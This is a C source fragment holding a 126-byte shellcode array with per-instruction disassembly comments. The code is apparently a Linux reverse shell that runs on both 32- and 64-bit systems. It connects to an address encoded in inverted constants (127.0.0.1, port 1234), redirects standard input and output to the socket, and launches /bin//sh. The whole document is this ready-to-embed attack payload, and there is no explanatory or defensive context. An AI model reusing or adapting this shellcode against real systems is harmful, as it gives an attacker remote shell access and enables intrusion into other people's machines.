
#define RS_SIZE 126

char RS[] = {
  /* 0000 */ "\xcc"                         /* int3                            */
  /* 0001 */ "\xb9\xfd\xff\xfb\x2d"         /* mov ecx, 0x2dfbfffd             */
  /* 0006 */ "\xba\x80\xff\xff\xfe"         /* mov edx, 0xfeffff80             */
  /* 000B */ "\xf7\xd1"                     /* not ecx                         */
  /* 000D */ "\xf7\xd2"                     /* not edx                         */
  /* 000F */ "\x50"                         /* push rax                        */
  /* 0010 */ "\x50"                         /* push rax                        */
  /* 0011 */ "\x89\x0c\x24"                 /* mov [rsp], ecx                  */
  /* 0014 */ "\x89\x54\x24\x04"             /* mov [rsp+0x4], edx              */
  /* 0018 */ "\x6a\x10"                     /* push 0x10                       */
  /* 001A */ "\x54"                         /* push rsp                        */
  /* 001B */ "\x31\xc0"                     /* xor eax, eax                    */
  /* 001D */ "\x99"                         /* cdq                             */
  /* 001E */ "\xb0\x67"                     /* mov al, 0x67                    */
  /* 0020 */ "\x6a\x01"                     /* push 0x1                        */
  /* 0022 */ "\x5e"                         /* pop rsi                         */
  /* 0023 */ "\x6a\x02"                     /* push 0x2                        */
  /* 0025 */ "\x5f"                         /* pop rdi                         */
  /* 0026 */ "\x48\x75\x15"                 /* jnz 0x3e                        */
  /* 0029 */ "\xb0\x29"                     /* mov al, 0x29                    */
  /* 002B */ "\x0f\x05"                     /* syscall                         */
  /* 002D */ "\x97"                         /* xchg edi, eax                   */
  /* 002E */ "\x96"                         /* xchg esi, eax                   */
  /* 002F */ "\xb0\x21"                     /* mov al, 0x21                    */
  /* 0031 */ "\x0f\x05"                     /* syscall                         */
  /* 0033 */ "\x4e\x79\xf9"                 /* jns 0x2f                        */
  /* 0036 */ "\x5e"                         /* pop rsi                         */
  /* 0037 */ "\x5a"                         /* pop rdx                         */
  /* 0038 */ "\xb0\x2a"                     /* mov al, 0x2a                    */
  /* 003A */ "\x0f\x05"                     /* syscall                         */
  /* 003C */ "\xeb\x1e"                     /* jmp 0x5c                        */
  /* 003E */ "\x56"                         /* push rsi                        */
  /* 003F */ "\x5b"                         /* pop rbx                         */
  /* 0040 */ "\x52"                         /* push rdx                        */
  /* 0041 */ "\x53"                         /* push rbx                        */
  /* 0042 */ "\x57"                         /* push rdi                        */
  /* 0043 */ "\x54"                         /* push rsp                        */
  /* 0044 */ "\x59"                         /* pop rcx                         */
  /* 0045 */ "\xcd\x80"                     /* int 0x80                        */
  /* 0047 */ "\x93"                         /* xchg ebx, eax                   */
  /* 0048 */ "\x59"                         /* pop rcx                         */
  /* 0049 */ "\xb0\x3f"                     /* mov al, 0x3f                    */
  /* 004B */ "\xcd\x80"                     /* int 0x80                        */
  /* 004D */ "\x49\x79\xf9"                 /* jns 0x49                        */
  /* 0050 */ "\x58"                         /* pop rax                         */
  /* 0051 */ "\x58"                         /* pop rax                         */
  /* 0052 */ "\x53"                         /* push rbx                        */
  /* 0053 */ "\x54"                         /* push rsp                        */
  /* 0054 */ "\x59"                         /* pop rcx                         */
  /* 0055 */ "\x6a\x03"                     /* push 0x3                        */
  /* 0057 */ "\x5b"                         /* pop rbx                         */
  /* 0058 */ "\xb0\x66"                     /* mov al, 0x66                    */
  /* 005A */ "\xcd\x80"                     /* int 0x80                        */
  /* 005C */ "\x99"                         /* cdq                             */
  /* 005D */ "\x50"                         /* push rax                        */
  /* 005E */ "\x50"                         /* push rax                        */
  /* 005F */ "\x50"                         /* push rax                        */
  /* 0060 */ "\x54"                         /* push rsp                        */
  /* 0061 */ "\x5b"                         /* pop rbx                         */
  /* 0062 */ "\x53"                         /* push rbx                        */
  /* 0063 */ "\x5f"                         /* pop rdi                         */
  /* 0064 */ "\xc7\x07\x2f\x62\x69\x6e"     /* mov dword [rdi], 0x6e69622f     */
  /* 006A */ "\xc7\x47\x04\x2f\x2f\x73\x68" /* mov dword [rdi+0x4], 0x68732f2f */
  /* 0071 */ "\x40\x75\x04"                 /* jnz 0x78                        */
  /* 0074 */ "\xb0\x3b"                     /* mov al, 0x3b                    */
  /* 0076 */ "\x0f\x05"                     /* syscall                         */
  /* 0078 */ "\x31\xc9"                     /* xor ecx, ecx                    */
  /* 007A */ "\xb0\x0b"                     /* mov al, 0xb                     */
  /* 007C */ "\xcd\x80"                     /* int 0x80                        */
};